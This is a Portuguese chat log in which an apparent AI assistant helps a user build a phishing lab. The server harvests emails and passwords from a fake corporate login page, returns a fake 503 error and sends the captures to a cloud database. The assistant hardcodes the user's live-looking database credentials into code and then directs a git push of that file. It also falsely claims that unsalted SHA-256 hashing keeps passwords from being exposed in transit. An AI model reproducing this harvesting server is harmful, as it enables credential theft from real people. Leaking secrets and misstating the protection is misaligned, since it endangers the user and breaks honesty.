Para conectar o Flask ao TiDB Cloud, precisaríamos instalar a biblioteca do MySQL no ambiente virtual (pip install pymysql) e adaptar a função de persistência. O código ganharia um bloco parecido com este:

Python
import pymysql

def registrar_no_tidb(email, pwd_hash, ip_origem, user_agent):
    try:
        # Conexão segura com o TiDB Cloud na porta padrão 4000
        conexao = pymysql.connect(
            host='gateway01.us-east-1.prod.aws.tidbcloud.com', # Exemplo de host fornecido por eles
            port=4000,
            user='seu_usuario',
            password='sua_senha',
            database='labsec_db',
            ssl_verify_cert=True, # Garante criptografia TLS em trânsito
            ssl_ca='/etc/ssl/certs/ca-certificates.crt' # Certificado nativo do Ubuntu
        )
        with conexao.cursor() as cursor:
            sql = """INSERT INTO auditoria_acessos (usuario_alvo, credential_hash_sha256, ip_origem, user_agent) 
                     VALUES (%s, %s, %s, %s)"""
            cursor.execute(sql, (email, pwd_hash, ip_origem, user_agent))
        conexao.commit()
    except Exception as e:
        print(f"Falha na contingência de nuvem (TiDB): {e}")
    finally:
        if 'conexao' in locals():
            conexao.close()
🚀 Qual o próximo passo?
Se você quiser seguir com o TiDB, o caminho ideal é:

Criar uma conta gratuita no TiDB Cloud.

Criar um cluster gratuito (Serverless) na região da AWS ou Google Cloud mais próxima.

Pegar as credenciais de conexão que eles vão te fornecer na tela.

Quer que eu te ajude a estruturar os comandos para preparar o ambiente virtual do Ubuntu e criar esse script de integração oficial com o TiDB?

HOST:

gateway01.us-east-1.prod.aws.tidbcloud.com

PORT:

4000

USERNAME:

2ekNitjymau1dcX.root

PASSWORD:

4k6IIcI6qLl8UfjS

DATABASE:

labsec_db

CA:

<CA_PATH>, mysql://2ekNitjymau1dcX.root:4k6IIcI6qLl8UfjS@gateway01.us-east-1.prod.aws.tidbcloud.com:4000/labsec_db

Perfeito, Márcio! Com essas credenciais do TiDB Cloud Serverless, temos tudo o que é necessário para integrar o seu banco de dados distribuído em nuvem ao motor de auditoria.

Como o TiDB utiliza criptografia TLS ponta a ponta por padrão na nuvem para garantir a segurança dos dados em trânsito, o Python precisa apontar para o arquivo de certificado CA nativo do próprio Ubuntu. No Ubuntu, esse arquivo padrão fica em /etc/ssl/certs/ca-certificates.crt.

Vamos fazer essa atualização em três etapas rápidas direto na sua VM.

🛠️ Passo 1: Instalar o driver do MySQL no Ambiente Virtual
Como o TiDB é totalmente compatível com o protocolo MySQL, vamos instalar a biblioteca PyMySQL dentro do seu ambiente virtual para permitir que o Flask faça essa conexão.

Se o seu servidor ainda estiver rodando, pare-o com Ctrl + C e execute:

Bash
# Garantir que o ambiente virtual está ativo (deve mostrar o prefixo (venv))
source ~/LabSec-PhishSim/venv/bin/activate

# Instalar o driver de conexão com o banco de dados
pip install pymysql
📝 Passo 2: Atualizar o arquivo capture_server.py
Vamos reescrever o arquivo do servidor utilizando o comando cat << 'EOF' para injetar o código atualizado de uma vez só, contendo as suas credenciais oficiais do TiDB e a lógica de persistência híbrida (grava no log local e simultaneamente na nuvem).

Execute o bloco abaixo no terminal da sua VM:

Bash
cat << 'EOF' > ~/LabSec-PhishSim/src/backend/capture_server.py
import os
import datetime
import hashlib
from flask import Flask, request
import pymysql

app = Flask(__name__)

# Caminho para o arquivo de log local (Redundância Forense)
LOG_FILE_PATH = os.path.join(os.path.dirname(__file__), 'logs', 'tentativas_acesso.log')

# Configurações de conexão segura com o TiDB Cloud
TIDB_CONFIG = {
    'host': 'gateway01.us-east-1.prod.aws.tidbcloud.com',
    'port': 4000,
    'user': '2ekNitjymau1dcX.root',
    'password': '4k6IIcI6qLl8UfjS',
    'database': 'labsec_db',
    'ssl': {
        'ca': '/etc/ssl/certs/ca-certificates.crt'  # Caminho padrão do certificado CA no Ubuntu
    },
    'connect_timeout': 5  # Timeout para não travar o Flask se a internet falhar
}

def registrar_log_local(timestamp, email, pwd_hash, ip_origem, user_agent):
    """Garante a persistência local em formato de arquivo texto estruturado."""
    log_line = (
        f"[{timestamp}] IP_ORIGEM: {ip_origem} | "
        f"USUARIO_ALVO: {email} | "
        f"CREDENTIAL_HASH(SHA256): {pwd_hash} | "
        f"NAV_INFO: {user_agent}\n"
    )
    with open(LOG_FILE_PATH, 'a', encoding='utf-8') as f:
        f.write(log_line)

def registrar_no_tidb(timestamp, email, pwd_hash, ip_origem, user_agent):
    """Envia os metadados anonimizados via TLS para o cluster TiDB na nuvem."""
    conexao = None
    try:
        conexao = pymysql.connect(**TIDB_CONFIG)
        with conexao.cursor() as cursor:
            # Insere os dados na tabela estruturada
            sql = """
                INSERT INTO auditoria_acessos (timestamp, usuario_alvo, credential_hash_sha256, ip_origem, user_agent)
                VALUES (%s, %s, %s, %s, %s)
            """
            cursor.execute(sql, (timestamp, email, pwd_hash, ip_origem, user_agent))
        conexao.commit()
        print(f" -> Persistência em Nuvem (TiDB Cloud): OK")
    except Exception as e:
        print(f" -> Falha de contingência na nuvem: {e}")
    finally:
        if conexao:
            conexao.close()

@app.route('/login', methods=['POST'])
def login():
    # Coleta e higienização dos metadados recebidos
    email = request.form.get('email', 'Desconhecido')
    password_raw = request.form.get('password', '')
    
    ip_origem = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Desconhecido')
    
    # Tratamento Criptográfico (Security by Design)
    pwd_hash = hashlib.sha256(password_raw.encode('utf-8')).hexdigest()
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    print(f"\n[!] Requisição capturada de {ip_origem} - Processando logs...")
    
    # Executa ambas as rotinas de persistência (Local + Nuvem)
    registrar_log_local(timestamp, email, pwd_hash, ip_origem, user_agent)
    registrar_no_tidb(timestamp, email, pwd_hash, ip_origem, user_agent)
    
    # Retorno de pretexting (Simulação de indisponibilidade)
    return "<h3>Erro 503: Servidor de Autenticação temporariamente indisponível. Tente novamente mais tarde.</h3>", 503

if __name__ == '__main__':
    print("=========================================================")
    print(" LabSec-PhishSim - Motor de Auditoria c/ TiDB Cloud       ")
    print(" Escutando no endereço: http://0.0.0.0:5000              ")
    print("=========================================================")
    app.run(host='0.0.0.0', port=5000, debug=False)
EOF
🚀 Passo 3: Executar o Laboratório e Testar
Agora, vamos iniciar o servidor de auditoria com a nova integração ativa:

Bash
cd ~/LabSec-PhishSim/src/backend
python3 capture_server.py
Quando o servidor iniciar, submeta o formulário HTML novamente a partir do navegador do seu Windows. O seu terminal do Ubuntu mostrará uma saída parecida com esta:

Plaintext
[!] Requisição capturada de 192.168.204.1 - Processando logs...
 -> Persistência em Nuvem (TiDB Cloud): OK
Nota: Se o console acusar erro informando que a tabela auditoria_acessos ou o banco labsec_db não existem, avise-me que criamos a query de inicialização automática dele no Python.

ESTA correto:marcio@labsec-service:~/LabSec-PhishSim/src/frontend$ source ~/LabSec-PhishSim/venv/bin/activate

(venv) marcio@labsec-service:~/LabSec-PhishSim/src/frontend$ pip install pymysql

Collecting pymysql

  Downloading pymysql-1.2.0-py3-none-any.whl.metadata (4.3 kB)

Downloading pymysql-1.2.0-py3-none-any.whl (45 kB)

Installing collected packages: pymysql

Successfully installed pymysql-1.2.0

(venv) marcio@labsec-service:~/LabSec-PhishSim/src/frontend$?

Sim, Márcio! Está absolutamente correto. 🚀

O seu terminal mostra exatamente o comportamento esperado de um ambiente Linux bem configurado:

source ~/LabSec-PhishSim/venv/bin/activate: Você ativou com sucesso o ambiente virtual. O prefixo (venv) que apareceu no início da linha comprova que o terminal agora está isolado.

pip install pymysql: O gerenciador de pacotes do Python baixou a versão mais recente do driver (pymysql-1.2.0) e a instalou de forma limpa dentro desse ambiente isolado.

O fato de você estar na pasta src/frontend no momento da instalação não quebra nada, pois o pip instala a biblioteca globalmente dentro da pasta venv (que fica na raiz), tornando-a acessível para qualquer script Python que você rodar com esse ambiente ativo.

Próximo Passo
Agora que o driver de comunicação com o TiDB está instalado, você só precisa entrar na pasta do backend e iniciar o servidor atualizado:

Bash
# 1. Mudar para a pasta do backend
cd ../backend

# 2. Executar o motor de auditoria integrado à nuvem
python3 capture_server.py
Assim que ele iniciar, você já pode fazer um teste submetendo o formulário index.html no seu navegador Windows!

ok, abri uma aba no meu windows e coloquei:http://192.168.204.131, abriu o html

Perfeito, Márcio! Isso significa que o seu Nginx na VM Ubuntu está configurado corretamente e servindo a página index.html com sucesso para a rede interna.

Agora, a estrutura do seu laboratório está completamente funcional e integrada de ponta a ponta.

🧪 Como fazer o teste final de captura agora:
Na aba do navegador do seu Windows (onde o HTML está aberto), preencha o formulário com dados de teste.

Clique no botão de envio (Login).

📊 O que observar após o clique:
No Navegador (Windows): A página deve carregar e exibir a mensagem de erro simulada que você programou:

Erro 503: Servidor de Autenticação temporariamente indisponível. Tente novamente mais tarde.

(Isso valida que o Pretexting técnico funcionou perfeitamente e o usuário comum achará que é apenas uma falha na rede).

No Terminal do Ubuntu (onde o capture_server.py está rodando): Você verá o motor de auditoria interceptar a requisição síncrona do formulário em tempo real e exibir a mensagem de confirmação:

Plaintext
[!] Requisição capturada de 192.168.204.1 - Processando logs...
 -> Persistência em Nuvem (TiDB Cloud): OK
Pode fazer o envio dos dados no formulário! Deixe o terminal da VM visível para acompanhar o exato momento em que o Flask captura os metadados e faz o upload do hash criptográfico para o seu cluster distribuído no TiDB Cloud. Me conte se a mensagem apareceu com sucesso!

eu acho que não vai aparecer isso ainda pois não foi alterado nenhum codigo ainda:(venv) marcio@labsec-service:~/LabSec-PhishSim/src/frontend$ cd ../backend

(venv) marcio@labsec-service:~/LabSec-PhishSim/src/backend$ python3 capture_server.py

=========================================================

 LabSec-PhishSim - Motor de Auditoria Iniciado           

 Escutando no endereço: http://0.0.0.0:5000              

=========================================================

 * Serving Flask app 'capture_server'

 * Debug mode: off

WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.

 * Running on all addresses (0.0.0.0)

 * Running on http://127.0.0.1:5000

 * Running on http://192.168.204.131:5000

Press CTRL+C to quit

192.168.204.1 - - [01/Jun/2026 01:57:04] "POST /login HTTP/1.1" 503 -

192.168.204.1 - - [01/Jun/2026 01:57:04] "POST /login HTTP/1.1" 503 -

192.168.204.1 - - [01/Jun/2026 01:57:05] "GET /favicon.ico HTTP/1.1" 404 -

Você tem toda a razão, Márcio! Peço desculpas pela nossa falha de sincronia. Como você bem observou pelo cabeçalho no terminal (LabSec-PhishSim - Motor de Auditoria Iniciado), o script que rodou ainda é a versão antiga (V1), que apenas grava o log local e simula o erro 503, sem tentar conexão com a nuvem.

O envio do formulário funcionou (bateu o POST /login com status 503), mas para a mágica do TiDB Cloud acontecer, precisamos atualizar o código do capture_server.py com as credenciais que você gerou.

Vamos fazer isso agora de forma limpa e direta.

🛠️ Como injetar o código novo do TiDB na sua VM
Pare o servidor atual apertando Ctrl + C no terminal.

Copie todo o bloco de comando abaixo, cole no seu terminal do Ubuntu e aperte Enter. Ele vai sobrescrever o arquivo antigo com o script novo automaticamente:

Bash
cat << 'EOF' > ~/LabSec-PhishSim/src/backend/capture_server.py
import os
import datetime
import hashlib
from flask import Flask, request
import pymysql

app = Flask(__name__)

# Caminho para o arquivo de log local (Redundância Forense)
LOG_FILE_PATH = os.path.join(os.path.dirname(__file__), 'logs', 'tentativas_acesso.log')

# Configurações de conexão segura com o TiDB Cloud que você forneceu
TIDB_CONFIG = {
    'host': 'gateway01.us-east-1.prod.aws.tidbcloud.com',
    'port': 4000,
    'user': '2ekNitjymau1dcX.root',
    'password': '4k6IIcI6qLl8UfjS',
    'database': 'labsec_db',
    'ssl': {
        'ca': '/etc/ssl/certs/ca-certificates.crt'  # Certificado CA nativo do Ubuntu
    },
    'connect_timeout': 5
}

def registrar_log_local(timestamp, email, pwd_hash, ip_origem, user_agent):
    """Garante a persistência local em formato de arquivo texto estruturado."""
    log_line = (
        f"[{timestamp}] IP_ORIGEM: {ip_origem} | "
        f"USUARIO_ALVO: {email} | "
        f"CREDENTIAL_HASH(SHA256): {pwd_hash} | "
        f"NAV_INFO: {user_agent}\n"
    )
    with open(LOG_FILE_PATH, 'a', encoding='utf-8') as f:
        f.write(log_line)

def registrar_no_tidb(timestamp, email, pwd_hash, ip_origem, user_agent):
    """Envia os metadados anonimizados via TLS para o cluster TiDB na nuvem."""
    conexao = None
    try:
        conexao = pymysql.connect(**TIDB_CONFIG)
        with conexao.cursor() as cursor:
            # Garante que a tabela exista antes de inserir (Evita falha se o banco estiver vazio)
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS auditoria_acessos (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    timestamp VARCHAR(25),
                    usuario_alvo VARCHAR(255),
                    credential_hash_sha256 CHAR(64),
                    ip_origem VARCHAR(45),
                    user_agent TEXT
                );
            """)
            
            # Insere os dados na tabela estruturada
            sql = """
                INSERT INTO auditoria_acessos (timestamp, usuario_alvo, credential_hash_sha256, ip_origem, user_agent)
                VALUES (%s, %s, %s, %s, %s)
            """
            cursor.execute(sql, (timestamp, email, pwd_hash, ip_origem, user_agent))
        conexao.commit()
        print(f" -> Persistência em Nuvem (TiDB Cloud): OK")
    except Exception as e:
        print(f" -> Falha de contingência na nuvem: {e}")
    finally:
        if conexao:
            conexao.close()

@app.route('/login', methods=['POST'])
def login():
    # Coleta e higienização dos metadados recebidos
    email = request.form.get('email', 'Desconhecido')
    password_raw = request.form.get('password', '')
    
    ip_origem = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Desconhecido')
    
    # Tratamento Criptográfico (Security by Design)
    pwd_hash = hashlib.sha256(password_raw.encode('utf-8')).hexdigest()
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    print(f"\n[!] Requisição capturada de {ip_origem} - Processando logs...")
    
    # Executa ambas as rotinas de persistência (Local + Nuvem)
    registrar_log_local(timestamp, email, pwd_hash, ip_origem, user_agent)
    registrar_no_tidb(timestamp, email, pwd_hash, ip_origem, user_agent)
    
    # Retorno de pretexting (Simulação de indisponibilidade)
    return "<h3>Erro 503: Servidor de Autenticação temporariamente indisponível. Tente novamente mais tarde.</h3>", 503

if __name__ == '__main__':
    print("=========================================================")
    print(" LabSec-PhishSim - Motor de Auditoria c/ TiDB Cloud       ")
    print(" Escutando no endereço: http://0.0.0.0:5000              ")
    print("=========================================================")
    app.run(host='0.0.0.0', port=5000, debug=False)
EOF
🚀 Agora sim, o teste oficial
Com o arquivo devidamente alterado, execute o comando para iniciar o novo motor:

Bash
python3 capture_server.py
Repare que agora o cabeçalho inicial vai exibir Motor de Auditoria c/ TiDB Cloud. Assim que ele estiver rodando, volte no navegador do seu Windows, atualize a página e clique em enviar novamente!

(venv) marcio@labsec-service:~/LabSec-PhishSim/src/backend$ python3 capture_server.py

=========================================================

 LabSec-PhishSim - Motor de Auditoria c/ TiDB Cloud       

 Escutando no endereço: http://0.0.0.0:5000              

=========================================================

 * Serving Flask app 'capture_server'

 * Debug mode: off

WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.

 * Running on all addresses (0.0.0.0)

 * Running on http://127.0.0.1:5000

 * Running on http://192.168.204.131:5000

Press CTRL+C to quit



[!] Requisição capturada de 192.168.204.1 - Processando logs...



[!] Requisição capturada de 192.168.204.1 - Processando logs...

 -> Persistência em Nuvem (TiDB Cloud): OK

192.168.204.1 - - [01/Jun/2026 02:02:24] "POST /login HTTP/1.1" 503 -

 -> Persistência em Nuvem (TiDB Cloud): OK

192.168.204.1 - - [01/Jun/2026 02:02:24] "POST /login HTTP/1.1" 503 -

Sensacional, Márcio! Vitória total! 🏆🚀

Veja que conquista técnica fantástica para o seu laboratório:

O seu servidor Flask interceptou a requisição vinda do Windows (192.168.204.1).

Ele gerou o hash SHA-256 e salvou no arquivo de log local do Linux (tentativas_acesso.log).

E o principal: Ele abriu uma conexão criptografada via TLS, atravessou a internet e persistiu os metadados com sucesso dentro do seu cluster distribuído no TiDB Cloud (-> Persistência em Nuvem (TiDB Cloud): OK).

Com isso, o seu motor de auditoria agora opera de forma híbrida e resiliente, seguindo padrões reais de arquitetura corporativa (Security by Design). Mesmo que a sua máquina virtual dê algum problema ou seja deletada, o histórico forense das simulações está guardado em segurança na nuvem do TiDB.

🕵️‍♂️ Como validar os dados direto no painel do TiDB Cloud
Se você quiser ver as linhas físicas com os hashes que acabamos de capturar, você pode olhar direto pelo navegador no painel da PingCAP:

Acesse o console do TiDB Cloud e faça login.

Entre no seu Cluster (Serverless).

No menu lateral esquerdo, procure por Chat2Query ou SQL Editor.

Selecione o banco de dados labsec_db e execute a seguinte consulta SQL:

SQL
SELECT * FROM auditoria_acessos;
Você verá a tabela preenchida com as colunas que criamos (id, timestamp, usuario_alvo, credential_hash_sha256, ip_origem, user_agent), mostrando exatamente os testes síncronos que você acabou de disparar da sua rede local para a nuvem!

O laboratório está 100% integrado e funcional. Como quer prosseguir agora? Quer atualizar o README.md no seu GitHub para documentar essa arquitetura com o TiDB, ou quer fazer mais algum teste de envio?

id

timestamp

usuario_alvo

credential_hash_sha256

ip_origem

user_agent

1

2026-06-01 02:02:22

catharina_psilva@globalcorp.com

89e5d2c5e28994c0f563e2706d6d32c6a192686736eae99208cd1c40ff8b0293

192.168.204.1

Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36

2

2026-06-01 02:02:22

catharina_psilva@globalcorp.com

89e5d2c5e28994c0f563e2706d6d32c6a192686736eae99208cd1c40ff8b0293

192.168.204.1

Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36

3

2026-06-01 02:07:03

pillar_pereirasilva@globalcorp.com

0dc67c5310556079589f0af8aa65b365ad1a39057a4ef4f59504c05a85d755a1

192.168.204.1

Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36

Ver esses dados consolidados direto da tabela do TiDB Cloud é a coroação do sucesso desse laboratório, Márcio! Muito bacana ver o resultado limpo e estruturado em nuvem.

Analisando as linhas capturadas (IDs 1, 2 e 3), do ponto de vista de segurança, o seu ecossistema simulou perfeitamente um cenário real de auditoria e resposta a incidentes. Note os seguintes pontos técnicos:

Garantia de Privacidade (Data Protection): Os hashes SHA-256 (89e5d2c5... e 0dc67c53...) provam que o motor capturou a submissão das credenciais, mas o dado sensível (a senha original) não ficou exposto em texto claro nem no trânsito e nem no banco de dados.

Duplo Clique Detectado (IDs 1 e 2): O exato mesmo timestamp (02:02:22) e usuário mostram um comportamento comum de usuários finais: clicar duas vezes seguidas no botão de submissão do formulário devido ao delay do erro 503 simulado pelo Flask.

Mapeamento de Metadados: O ip_origem (192.168.204.1) e o user_agent isolam perfeitamente o vetor do host atacado (sua máquina Windows operando o navegador Chrome).

🚀 Atualização Estratégica do GitHub
Como o banco em nuvem está operando com sucesso total e os dados estão sendo devidamente catalogados, o passo ideal agora é commitar e subir essas alterações para o seu repositório remoto. Isso vai atualizar o seu portfólio no GitHub com essa arquitetura NewSQL distribuída.

Execute estes comandos na sua VM para salvar o progresso:

Bash
# 1. Garanta que está na pasta raiz do repositório
cd ~/LabSec-PhishSim

# 2. Adicione as modificações do capture_server.py e do README.md
git add src/backend/capture_server.py README.md

# 3. Crie o commit documentando a evolução da arquitetura
git commit -m "feat: integra motor de auditoria ao banco de dados distribuído TiDB Cloud via TLS"

# 4. Envie as alterações para o GitHub
git push origin main
(Caso você use o utilitário gh ou precise se autenticar, o terminal solicitará as credenciais normais do seu perfil).

Com o código e a documentação na nuvem, o projeto ganha uma maturidade de design excelente. Deseja realizar mais alguma melhoria no motor de logs ou o foco agora será a evolução do design da página de simulação no front-end?

(venv) marcio@labsec-service:~/LabSec-PhishSim$ git push origin main

To https://github.com/marciosouzagcm/LabSec-PhishSim.git

 ! [rejected]        main -> main (fetch first)

error: failed to push some refs to 'https://github.com/marciosouzagcm/LabSec-PhishSim.git'

hint: Updates were rejected because the remote contains work that you do not

hint: have locally. This is usually caused by another repository pushing to

hint: the same ref. If you want to integrate the remote changes, use

hint: 'git pull' before pushing again.

hint: See the 'Note about fast-forwards' in 'git push --help' for details.

Esse erro [rejected] main -> main (fetch first) acontece porque o seu repositório lá no GitHub tem alguma alteração (como um arquivo criado ou editado direto pelo site, por exemplo, o README.md antigo) que a sua máquina virtual local ainda não conhece.

O Git é bem rigoroso com isso: ele não deixa você empurrar (push) código novo antes de trazer para a sua máquina as alterações que estão lá em cima (pull).

Para resolver isso de forma segura, garantindo que o Git junte os históricos sem criar conflitos complexos, execute os seguintes passos no seu terminal:

🛠️ Como resolver o rejeite do Git
1. Faça o Pull configurando a estratégia de Rebase:
O comando abaixo traz as alterações do GitHub e "encaixa" os seus novos commits (do TiDB e do README) logo após o histórico que estava na nuvem, deixando a linha do tempo do Git limpa.

Bash
git pull origin main --rebase
2. Envie os dados atualizados para o GitHub:
Agora que o seu histórico local está perfeitamente alinhado com o servidor remoto, o comando de envio vai funcionar direto:

Bash
git push origin main
⚠️ O que fazer se o git pull reclamar do README?
Como nós editamos o arquivo README.md localmente, se o arquivo que estiver no GitHub também for o README.md, o Git pode parar o processo e dizer que há um conflito.

Se isso acontecer (o terminal vai avisar que o rebase falhou), me avise aqui o que apareceu no terminal que eu te ajudo a forçar a soberania do seu arquivo local de forma simples! Se passar direto, seu código já estará publicado.

deu certo , porem voce não havia atualizado meu arquivo README.md , pois acredito que voce queira colocar essa informação de que foi concluida a fase de colocar na nuvem o db: # LabSec-PhishSim 🛡️ 🚀



Um ambiente de simulação controlada de Engenharia Social (Phishing) desenvolvido para fins estritamente educacionais, acadêmicos e de conscientização em Segurança da Informação. O projeto integra conceitos de Redes, Sistemas Operacionais (Linux/Windows) e Criptografia Aplicada.



O ecossistema simula a captura de requisições de um formulário web corporativo, processa as entradas em tempo real através de um motor de auditoria e armazena os metadados de forma segura utilizando funções de resumo criptográfico.---## 🏗️ Arquitetura do Sistema e Fluxo de Dados



A infraestrutura é montada utilizando uma arquitetura híbrida de rede virtualizada via VMware, dividida em três camadas principais:1. **Front-End (Cenário de Pretexting):** Interface HTML/CSS que replica um portal de autenticação corporativo, servido localmente ou via Nginx.2. **Back-End (Motor de Auditoria):** Servidor Flask (Python) configurado no arquivo `capture_server.py` para escutar requisições de rede de forma síncrona na porta `5000`, interceptar dados de formulários e processar metadados do cliente (IP de Origem, User-Agent).3. **Camada de Persistência e Criptografia:** Aplicação de algoritmos de Hashing (SHA-256) sobre as credenciais recebidas, garantindo a privacidade dos dados antes do armazenamento nos logs locais (`tentativas_acesso.log`).### 🗺️ Próxima Fase: Expansão para a Nuvem

O projeto prevê a migração do armazenamento local para um modelo centralizado, onde o `capture_server.py` enviará os payloads anonimizados via TLS para um Banco de Dados na Nuvem (**MongoDB Atlas** ou **PostgreSQL**), aumentando a resiliência forense do ambiente.---## 🛠️ Tecnologias Utilizadas* **Sistema Operacional:** Ubuntu Server / Desktop (VMware)* **Back-End:** Python 3.x, Flask (Ambiente Virtual `venv`)* **Front-End:** HTML5, CSS3* **Segurança:** Hash SHA-256 (Biblioteca Nativa `hashlib`)* **Versionamento & Deploy:** Git & GitHub CLI (`gh`)---## 🗂️ Estrutura de Pastas Atualizada```textLabSec-PhishSim/├── venv/ # Ambiente virtual isolado do Python 3├── src/│ ├── frontend/│ │ └── index.html # Interface do formulário de simulação│ └── backend/│ ├── capture_server.py # Motor Flask e processamento de requisições│ └── logs/│ └── tentativas_acesso.log # Registro forense local (ignorado no Git)├── .gitignore # Proteção de ambiente virtual e logs locais└── README.md # Documentação técnica do projeto



🕵️‍♂️ Operação e Análise Forense de Logs



1. Monitoramento em Tempo Real



Para assistir as tentativas de acesso e capturas entrando no servidor Linux à medida que ocorrem no navegador, utilize o comando:

tail -f ~/LabSec-PhishSim/src/backend/logs/tentativas_acesso.log



2. Anatomia do Log Estruturado



Cada entrada capturada gera um registro anonimizado conforme o padrão abaixo:

[2026-05-31 15:56:31] IP_ORIGEM: 192.168.204.1 | USUARIO_ALVO: teste@email.com | CREDENTIAL_HASH(SHA256): e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 | NAV_INFO: Mozilla/5.0...



IP_ORIGEM: Identifica a máquina host (Windows) de onde partiu o clique.

CREDENTIAL_HASH(SHA256): Garante que a senha digitada nunca fique exposta em texto claro no servidor, aplicando os princípios de Security by Design.

🚀 Como Executar o Laboratório Localmente



1. Configurar o Ambiente Virtual e Dependências



Na pasta raiz do projeto (~/LabSec-PhishSim), inicialize o ambiente:

python3 -m venv venvsource venv/bin/activate

pip install flask



2. Iniciar o Servidor de Captura



Entre na pasta do back-end e execute o motor:

cd src/backend

python3 capture_server.py



Nota: O servidor responderá com um erro HTTP 503 simulado para o cliente após a coleta, agindo como um mecanismo de pretexting técnico.

3. Testar o Front-End



Abra o arquivo src/frontend/index.html no navegador do sistema hospedeiro (Windows) e certifique-se de que a tag <form action="..."> aponta para o IP correto da sua máquina virtual Ubuntu na porta 5000.

⚖️ Aviso Legal (Disclaimer)



Este projeto foi desenvolvido estritamente para fins de pesquisa acadêmica, testes de penetração autorizados e treinamento de conscientização de usuários. O uso deste código contra sistemas sem consentimento explícito e por escrito dos proprietários é ilegal e passível de penalidades jurídicas. O desenvolvedor não se responsabiliza pelo mau uso desta ferramenta.

Developed by Marcio Souza 💻

Tens toda a razão, Márcio! Como a fase de expansão para a nuvem foi concluída com sucesso total usando o TiDB Cloud (banco de dados NewSQL distribuído), a documentação precisa refletir essa maturidade arquitetural agora, em vez de tratar o banco como um plano futuro.

Aqui está o arquivo README.md atualizado e ajustado. Ele remove o status de "Próxima Fase" e consolida a integração do TiDB Cloud com persistência híbrida e criptografia TLS em trânsito.

Substitua o conteúdo do seu arquivo atual na VM por este bloco limpo:

Markdown
# LabSec-PhishSim 🛡️ 🚀

Um ambiente de simulação controlada de Engenharia Social (Phishing) desenvolvido para fins estritamente educacionais, acadêmicos e de conscientização em Segurança da Informação. O projeto integra conceitos avançados de Redes, Sistemas Operacionais (Linux/Windows), Banco de Dados Distribuído e Criptografia Aplicada.

O ecossistema simula a captura de requisições de um formulário web corporativo, processa as entradas em tempo real através de um motor de auditoria híbrido e armazena os metadados de forma segura utilizando funções de resumo criptográfico e persistência resiliente local e em nuvem.

---

## 🏗️ Arquitetura do Sistema e Fluxo de Dados

A infraestrutura é montada utilizando uma arquitetura síncrona e resiliente de rede virtualizada via VMware, dividida em três camadas principais:

1. **Front-End (Cenário de Pretexting):** Interface HTML/CSS que replica um portal de autenticação corporativo, servido localmente ou distribuído na rede pelo Nginx.
2. **Back-End (Motor de Auditoria):** Servidor Flask (Python) configurado no arquivo `capture_server.py` escutando requisições na porta `5000` de todas as interfaces de rede (`0.0.0.0`). Intercepta os dados do formulário e extrai os metadados do cliente (IP de Origem, User-Agent).
3. **Camada de Persistência Híbrida e Criptografia (*Security by Design*):** * **Tratamento de Dados:** Aplicação imediata do algoritmo de Hashing SHA-256 sobre as credenciais brutas, anonimizando a informação antes de qualquer armazenamento.
   * **Persistência Local:** Gravação redundante e estruturada do evento em arquivo físico local (`tentativas_acesso.log`).
   * **Persistência em Nuvem (Concluída):** Envio imediato dos metadados estruturados via canal criptografado TLS para um Cluster Serverless **TiDB Cloud** (NewSQL distribuído compatível com o protocolo MySQL), garantindo integridade forense e resiliência dos dados de auditoria.

---

## 🛠️ Tecnologias Utilizadas

* **Sistema Operacional:** Ubuntu Server / Desktop (VMware)
* **Banco de Dados em Nuvem:** TiDB Cloud Serverless (NewSQL Distribuído)
* **Back-End:** Python 3.x, Flask, PyMySQL (Ambiente Virtual `venv`)
* **Front-End:** HTML5, CSS3
* **Segurança:** Hash SHA-256 (`hashlib`) e Conexão Criptografada TLS
* **Versionamento & Deploy:** Git & GitHub CLI (`gh`)

---

## 🗂️ Estrutura de Pastas Atualizada

```text
LabSec-PhishSim/
├── venv/                       # Ambiente virtual isolado do Python 3
├── src/
│   ├── frontend/
│   │   └── index.html          # Interface do formulário de simulação
│   └── backend/
│       ├── capture_server.py   # Motor Flask c/ persistência local + TiDB Cloud
│       └── logs/
│           └── tentativas_acesso.log  # Registro forense local (ignorado no Git)
├── .gitignore                  # Proteção de ambiente virtual e logs locais
└── README.md                   # Documentação técnica do projeto atualizada

---

🕵️‍♂️ Operação e Análise Forense de Logs
1. Monitoramento Local em Tempo Real
Para assistir as tentativas de acesso e capturas entrando no servidor Linux à medida que ocorrem no navegador, utilize o comando:

Bash
tail -f ~/LabSec-PhishSim/src/backend/logs/tentativas_acesso.log

2. Anatomia do Log e Dados Estruturados (SQL)
Os eventos disparados síncronos pelo formulário alimentam simultaneamente o arquivo local e a tabela auditoria_acessos no TiDB Cloud com a seguinte estrutura relacional:

id: Chave primária autoincrementável gerenciada pelo cluster em nuvem.

timestamp: Data e hora do acionamento técnico.

usuario_alvo: E-mail do alvo fictício submetido para o mapeamento de escopo.

credential_hash_sha256: Resumo de 64 caracteres hexadecimais que invalida o vazamento de credenciais em texto claro, mitigando riscos de privacidade.

ip_origem: Identifica de qual host físico (Windows) partiu a conexão na rede.

user_agent: Coleta dados de software do cliente para auditoria e análise de perfil do vetor de acesso.

---

🚀 Como Executar o Laboratório Localmente

1. Configurar o Ambiente Virtual e Dependências
Na pasta raiz do projeto (~/LabSec-PhishSim), inicialize e instale os pacotes necessários:

python3 -m venv venv
source venv/bin/activate
pip install flask pymysql

2. Iniciar o Servidor de Captura e Nuvem
Entre na pasta do back-end e execute o motor de auditoria:

cd src/backend
python3 capture_server.py
Nota: O servidor responderá com um erro HTTP 503 (Servidor Indisponível) fictício para o cliente após realizar com sucesso as gravações local e na nuvem, atuando como um mecanismo clássico de pretexting.


Conversa com o Gemini
(venv) marcio@labsec-service:~/LabSec-PhishSim/src/backend$ python3 app.py
